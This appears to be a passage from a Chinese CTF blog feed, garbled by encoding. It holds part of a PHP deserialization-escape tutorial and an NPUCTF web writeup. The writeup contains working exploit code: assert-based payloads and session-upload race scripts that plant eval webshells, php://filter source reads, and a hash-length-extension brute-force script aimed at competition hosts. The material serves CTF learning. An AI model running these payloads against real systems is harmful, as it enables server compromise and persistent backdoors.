__destruct()&#123;</span></span><br><span class="line">    <span class="comment">//     $c = &#x27;a&#x27;.$this-&gt;b;</span></span><br><span class="line">    <span class="comment">//     echo $c;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="comment">// function __toString()&#123;</span></span><br><span class="line">    <span class="comment">//     echo file_get_contents($this-&gt;c);</span></span><br><span class="line">    <span class="comment">//     return &#x27;nice&#x27;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="keyword">new</span> C;</span><br><span class="line">$c-&gt;c=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$b=<span class="keyword">new</span> B;</span><br><span class="line">$b-&gt;b=$c;</span><br><span class="line">$a=<span class="keyword">new</span> A($b,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„åºåˆ—åŒ–ç»“æœæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬ä¼ çš„Aç±»usernameå±æ€§æ˜¯ä¸€ä¸ªBå¯¹è±¡ï¼Œæ‰€ä»¥åé¢å°±å˜æˆäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªBå¯¹è±¡çš„bå±æ€§æ˜¯ä¸€ä¸ªCå¯¹è±¡ï¼Œæ‰€ä»¥è¿˜èƒ½åˆ†è§£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ˜ç™½ç±»é‡Œé¢åµŒå¥—ç±»çš„åºåˆ—åŒ–æ ¼å¼ï¼Œæˆ‘ä»¬å†æ¥çœ‹æ€æœ«é€ƒé€¸å‡ºå»çš„ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“çš„ä¸‹é¢ä¸€ä¸²æ˜¯æˆ‘ä»¬éœ€è¦æ·»ä¸Šå»çš„ï¼Œé•¿åº¦ä¸º58</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æŠŠåºåˆ—åŒ–å­—ç¬¦ä¸²æ”¾åˆ°usernameé‚£é‡Œï¼Œå¹¶ä¸”ç”¨ä¹‹å‰é‚£ä¸ªä¾‹å­å˜é•¿çš„é‚£ç§æ€è·¯ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å¹¶ä¸è¡Œï¼Œå› ä¸ºç»è¿‡æ›¿æ¢ä¹‹åå®ƒåˆæ›¿æ¢å›æ¥äº†,æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨å˜çŸ­çš„æ€è·¯</p><p>æ€»çš„æ€è·¯:é€šä¿—çš„è¯´å°±æ˜¯usernameåƒæ‰åé¢çš„password</p><p>æ­£å¸¸åºåˆ—åŒ–å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬éœ€è¦æ·»åŠ çš„å°±å˜æˆï¼Œé•¿åº¦ä¸º72</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¦åƒæ‰çš„å°±æ˜¯,é•¿åº¦23ï¼Œ**é‚£é‡Œè¡¨ç¤ºä¸¤ä½ï¼Œè¡¨ç¤ºpasswordçš„é•¿åº¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:**:&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ—æ–¹ç¨‹,nä»£è¡¨<code>\0\0\0</code>çš„æ•°ç›®ï¼Œyè¡¨ç¤ºå…¶å®ƒå­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>n+y=<span class="number">3</span>n+<span class="number">23</span>+y<span class="comment">// åŸå­—ç¬¦é•¿åº¦ = åƒæ‰&quot;;s:8:&quot;password&quot;;s:**:&quot; + æ›¿æ¢åé•¿åº¦ </span></span><br><span class="line"><span class="comment">//å…¶å®ƒå­—ç¬¦åœ¨æ›¿æ¢æ—¶ä¸å—å½±å“ å¯ä»¥ä¸è€ƒè™‘</span></span><br></pre></td></tr></table></figure><p>è®¡ç®—ä¸€ä¸‹å‘ç°3n=23,é™¤ä¸å°½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ”¹ä¸‹åé¢é‚£ä¸²ï¼Œå‰é¢å¢åŠ ç‚¹ä¸œè¥¿ï¼Œç±»ä¼¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>æƒ³è·å–å¤šç§payloaadï¼Œæˆ‘ä»¬å¯ä»¥åˆ—å¼å­ï¼Œkè¡¨ç¤ºå¢åŠ çš„å­—ç¬¦é•¿åº¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>n+y=<span class="number">3</span>n+<span class="number">23</span>+y+k</span><br></pre></td></tr></table></figure><p>å½“k=1æ—¶ n=8</p><p>å¯ä»¥æ„é€ payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;b=a<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å½“k=4 n=9</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;abcd&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/6718">https://xz.aliyun.com/t/6718</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF writeup</title>
      <link href="2020/04/18/NPUCTF-writeup/"/>
      <url>2020/04/18/NPUCTF-writeup/</url>
      
        <content type="html"><![CDATA[<p>è®°ä¸€ä¸‹writeup!    wtcl!</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="æŸ¥æºç "><a href="#æŸ¥æºç " class="headerlink" title="æŸ¥æºç "></a>æŸ¥æºç </h3><p>æŸ¥æºç å¾—åˆ°flag</p><h3 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h3><p>åœ¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/time.php?source</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125; </span><br><span class="line">$c=<span class="keyword">new</span> HelloPhp;</span><br><span class="line">$c-&gt;a = <span class="string">&#x27;file_put_contents(&quot;1.php&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));&#x27;</span>;</span><br><span class="line">$c-&gt;b = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿ä¸Šä»¥åbypass disable_fuctionåœ¨ç¯å¢ƒå˜é‡é‡Œæ‰¾åˆ°flag</p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>æŸ¥çœ‹æºç å‘ç°<code>index.bak.php</code></p><p>ä¼ªåè®®è¯»æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.bak.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;msg.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;content-type:application/json&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$msg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($msg)&gt;<span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;msg is too loooong!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">&quot;/php/&quot;</span>,<span class="string">&quot;?&quot;</span>,$msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;msg&#x27;</span>])&amp;<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;msg&#x27;</span>]))$_SESSION[<span class="string">&#x27;msg&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;msg&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    array_push($_SESSION[<span class="string">&#x27;msg&#x27;</span>], [<span class="string">&#x27;msg&#x27;</span>=&gt;safe($_POST[<span class="string">&#x27;msg&#x27;</span>]),<span class="string">&#x27;time&#x27;</span>=&gt;date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,time())]);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>([<span class="string">&#x27;msg&#x27;</span>=&gt;safe($_POST[<span class="string">&#x27;msg&#x27;</span>]),<span class="string">&#x27;time&#x27;</span>=&gt;date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,time())]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_SESSION[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&quot;è¿˜ä¸å¿«å»ç•™è¨€ï¼&quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†è¯»ä¸‹<code>index.bak.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;location:./index.bak.php?action=message.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œèƒ½åŒ…å«ï¼Œèƒ½æ§åˆ¶sessionå†…å®¹ï¼Œä½†æ˜¯æ— æ³•å†™å…¥phpå†…å®¹è¿›é‡Œé¢</p><p>æœ‰ä¸ªphpinfo.phpï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åŒ…å«ä¸´æ—¶æ–‡ä»¶é‚£ç§</p><p>ç›´æ¥ç”¨Vulhubä¸Šçš„exp:</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p><p>æˆ–è€…ç”¨sessionä¸Šä¼ è¿›åº¦é‚£ç§æ–¹å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47.97.210.141:9555/index.php&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=dddd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php echo &quot;flag&quot;;file_put_contents(&#x27;/var/www/html/a.php&#x27;,&#x27;&lt;?php @eval($_POST[1]);&#x27;);?&gt;&#x27;&#x27;&#x27;</span>    <span class="comment">#æ¶æ„è¿›åº¦ä¿¡æ¯ï¼Œreadfileå°†ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹</span></span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">        <span class="comment"># print(&#x27;[+]POST&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t=r.get(<span class="string">&quot;http://47.97.210.141:9555/index.bak.php?action=/tmp/sess_dddd&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=POST,args=()).start()</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><p>ç„¶åèšå‰‘è¿ï¼Œbypass disable_functionå°±è¡Œäº†</p><h3 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h3><p>æŠ“åŒ…çœ‹åˆ°</p><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200423111717.png" style="zoom:80%;"><p>å¾ˆæ˜æ˜¾hashé•¿åº¦æ‰©å±•æ”»å‡»</p><p>è¿™é¢˜å‡ºçš„å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥æŠŠhashç»™äº†å‡ºæ¥ï¼Œå¦‚ä¸‹å›¾æŠŠHashçš„å€¼å¤åˆ¶åˆ°passå°±å¯ä»¥ç»•è¿‡</p><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200423152852.png" style="zoom:80%;"><p>æŒ‰ç…§æ­£å¸¸çš„æ€è·¯æˆ‘ä»¬æ˜¯éœ€è¦çˆ†ç ´é•¿åº¦çš„ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“<code>$secret+æŸä¸ªå€¼</code>çš„hashå€¼ï¼Œå°è¯•çš„è¿˜æ˜¯ä¸Šé¢çš„æ“ä½œ</p><p>ç„¶åå°±å¯ä»¥å†™expäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn/?&#x27;</span></span><br><span class="line">hsh=<span class="string">&#x27;576322dd496b99d07b5b0f7fa7934a25&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">m=hashpumpy.hashpump(hsh,s1,s2,i)</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">name=urllib.quote(urllib.unquote(m[<span class="number">1</span>]))</span><br><span class="line">uri=url+<span class="string">&#x27;name=&#x27;</span>+name+<span class="string">&quot;&amp;pass=&quot;</span>+m[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> uri</span><br><span class="line">r=requests.get(uri)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> r.text;</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>hashpumpy.hashpump()</code>å››ä¸ªå‚æ•°çš„æ„æ€ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$hash1 = md5($secret.$salt1);</span><br><span class="line">$hash2 = md5($secret.$salt2);</span><br><span class="line"></span><br><span class="line">==&gt; hashpumpy.hashpump($hash1,$salt1,$salt2,i)    <span class="comment">// iä»£è¡¨$secretçš„é•¿åº¦</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè·‘å‡ºæ¥secreté•¿åº¦ä¸º32ï¼Œé‡å®šå‘åˆ°<code>flflflflag.php</code></p><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200423173553.png" style="zoom:80%;"><p>è®¿é—®ä¼šé‡å®šå‘åˆ°404.html,æŠ“åŒ…å‘ç°</p><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200423173914.png" style="zoom:80%;"><p>åŒ…å«ï¼Œä¼ªåè®®è¯»æºå—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php://filter/read=convert.base64-encode/resource=flflflflag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒ…å«flagæ— æœï¼Œè¯•ç€å†™ä¸´æ—¶æ–‡ä»¶</p><p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p><p>åˆ©ç”¨<code>7.0.0 &lt;= PHP Version &lt; 7.0.28</code>çš„æ¼æ´æˆ‘ä»¬å¯ä»¥å†™å‡ºexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span 